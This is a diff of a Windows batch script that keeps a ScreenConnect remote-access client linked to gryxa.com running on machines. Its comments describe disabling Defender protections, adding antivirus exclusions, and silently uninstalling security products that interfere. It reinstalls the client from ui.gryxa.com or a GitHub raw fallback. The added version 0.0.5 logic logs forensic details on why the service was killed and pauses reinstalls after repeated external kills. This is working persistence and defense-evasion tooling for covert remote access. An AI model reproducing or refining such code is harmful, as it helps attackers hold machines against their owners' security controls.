@@ -1,5 +1,5 @@
 @echo off
-rem WINRTCS_GUARD 0.0.4 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
+rem WINRTCS_GUARD 0.0.5 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
 rem ScreenConnect Client service whose ImagePath contains gryxa.com. Keepers (sevrz) never match.
 rem Ladder: start -> restart -> reinstall (UI MSI -> repo fallback).
 rem 0.0.2: fight-back escalation, evidence-driven via fight.cnt streak (resets only on clean run):
@@ -7,13 +7,16 @@ rem   streak>=2 -> counter Defender (RTM/behavior/IOAV off + policy pins) + stop
 rem   streak>=3 -> uninstall the interfering product (once per day, msiexec-quiet or silent flags)
 rem 0.0.3: install preconditioning (kill svc -> msiexec /x shared PC -> purge phantom Installer keys
 rem   -> orphan/gryxa dir sweep) + one retry; counter reset moved here from the agent gate.
-rem 0.0.4: shields that actually land BEFORE install - literal gryxa dir exclusions via Policies
-rem   channel (Tamper-Protection-safe, wildcards don't work in ExclusionPath) + bounded async
-rem   Add-MpPreference (60s cap, then proceed); post-install re-shield of the REAL ImagePath dir;
-rem   FAIL_svc_not_running / FAIL_msiexec / no_session now bump the streak (0.0.3 looped at 0);
-rem   fast-recheck cadence (guard.cnt=170, ~10 min) after any install/recovery so a client killed
-rem   right after verify is caught in minutes, not 3h; W-wait reset fix for install retries;
-rem   install cap (2 per run) so fight->install can't loop forever inside one run.
+rem 0.0.4: shields that actually land BEFORE install (literal Policies-channel exclusions, TP-safe,
+rem   bounded async cmdlet) + post-install re-shield of real ImagePath dir; all failure paths bump
+rem   the streak; guard.cnt=170 (~10 min) recheck after install/recovery; W-wait reset fix.
+rem 0.0.5: external-kill brake + forensics. On hosts like PC-EVITA-X6 where msiexec exits 0 but
+rem   the service never runs and its entry vanishes with NO Defender detections and NO 3rd-party
+rem   AV (kiosk/cafe software, anti-executable, silent agent), the reinstall loop just spammed
+rem   duplicate console entries (new device GUID per install). Now: FAIL_svc_not_running captures
+rem   ImagePath + binary-existence + Service Control Manager start-failure events into the log
+rem   (names the killer), and after 3 consecutive external kills installs pause (hourly recheck)
+rem   until a payload resets extkill.cnt.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -21,6 +24,7 @@ set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "LOG=%ZD%\guard.log"
 set "STREAKF=%ZD%\fight.cnt"
+set "EXTF=%ZD%\extkill.cnt"
 set "PRESENT=%ZD%\gryxa_present.flag"
 set "LOCK=%ZD%\guard.lock"
 set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
@@ -40,12 +44,19 @@ set "RI=0"
 if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1
 set "STREAK=0"
 if exist "%STREAKF%" set /p "STREAK=" <"%STREAKF%"
-echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK!>>"%LOG%"
+set "EXTK=0"
+if exist "%EXTF%" set /p "EXTK=" <"%EXTF%"
+echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK! extkill=!EXTK!>>"%LOG%"
 
 call :Shields
 
 call :Detect
 if not defined GSVC (
+  if !EXTK! GEQ 3 (
+    echo [%DATE% %TIME%] installs_paused extkill=!EXTK! recheck=60m>>"%LOG%"
+    echo 60>"%ZD%\guard.cnt"
+    goto :Done
+  )
   if exist "%PRESENT%" ( set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%" & echo [%DATE% %TIME%] gryxa_absent streak=!STREAK!>>"%LOG%" ) else ( echo [%DATE% %TIME%] gryxa_absent_fresh>>"%LOG%" )
   goto :FightThenInstall
 )
@@ -59,6 +70,12 @@ if errorlevel 1 (
   if errorlevel 1 (
     set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
     echo [%DATE% %TIME%] start_fail streak=!STREAK!>>"%LOG%"
+    call :Forensics
+    if !EXTK! GEQ 3 (
+      echo [%DATE% %TIME%] installs_paused extkill=!EXTK! recheck=60m>>"%LOG%"
+      echo 60>"%ZD%\guard.cnt"
+      goto :Done
+    )
     goto :FightThenInstall
   )
   echo 170>"%ZD%\guard.cnt"
@@ -81,6 +98,7 @@ goto :FightThenInstall
 
 :Healthy
 echo 0>"%STREAKF%"
+echo 0>"%EXTF%"
 echo %DATE% %TIME%>"%PRESENT%"
 echo [%DATE% %TIME%] healthy !GSVC!>>"%LOG%"
 goto :Done
@@ -186,7 +204,14 @@ if defined GSVC (
 set /a W+=1
 if !W! LSS 12 goto :WaitSvc
 set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
-echo [%DATE% %TIME%] FAIL_svc_not_running streak=!STREAK!>>"%LOG%"
+set /a "EXTK+=1" & echo !EXTK!>"%EXTF%"
+echo [%DATE% %TIME%] FAIL_svc_not_running streak=!STREAK! extkill=!EXTK!>>"%LOG%"
+call :Forensics
+if !EXTK! GEQ 3 (
+  echo [%DATE% %TIME%] installs_paused extkill=!EXTK! recheck=60m>>"%LOG%"
+  echo 60>"%ZD%\guard.cnt"
+  goto :Done
+)
 goto :FightThenInstall
 
 :SvcUp
@@ -215,6 +240,7 @@ timeout /t 5 /nobreak >nul 2>&1
 call :Session
 if defined GUP (
   echo %DATE% %TIME%>"%PRESENT%"
+  echo 0>"%EXTF%"
   echo [%DATE% %TIME%] installed_verified !GSVC! src=!SRC! recheck=10m>>"%LOG%"
   echo 170>"%ZD%\guard.cnt"
   del /f /q "%MSI%" >nul 2>&1
@@ -247,6 +273,13 @@ if not defined GPID exit /b 0
 if "!GPID!"=="0" exit /b 0
 netstat -ano 2>nul | findstr /C:"ESTABLISHED" | findstr /E /C:" !GPID!" >nul 2>&1
 if not errorlevel 1 set "GUP=1"
+exit /b 0
+
+:Forensics
+rem --- capture why the service died: ImagePath, binary still on disk?, SCM start-failure events ---
+if not defined GSVC ( echo [%DATE% %TIME%] svc_never_registered>>"%LOG%" & exit /b 0 )
+powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $ip=$null; try{ $ip=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\!GSVC!' -Name ImagePath).ImagePath }catch{}; if($ip){ $o+=('imgpath ' + $ip); $bin=$ip; if($bin -match '^\"([^\"]+)\"'){ $bin=$Matches[1] } elseif($bin -match '^(\S+)'){ $bin=$Matches[1] }; $o+=('bin_exists ' + (Test-Path $bin)) } else { $o+='imgpath none' }; $ev=Get-WinEvent -FilterHashtable @{LogName='System'; ProviderName='Service Control Manager'; StartTime=(Get-Date).AddMinutes(-30)} | Where-Object {$_.Message -match [regex]::Escape('!GSVC!')} | Select-Object -First 4; foreach($e in $ev){ $m=($e.Message -replace '\s+',' '); $o+=('scm_' + $e.Id + ' ' + $m.Substring(0,[Math]::Min(200,$m.Length))) }; if(-not $ev){ $o+='scm_no_events' }; $o | Set-Content -Path '%ZD%\svc_dead.out' -Encoding ASCII" >nul 2>&1
+if exist "%ZD%\svc_dead.out" ( type "%ZD%\svc_dead.out">>"%LOG%" & del /f /q "%ZD%\svc_dead.out" >nul 2>&1 )
 exit /b 0
 
 :Shields
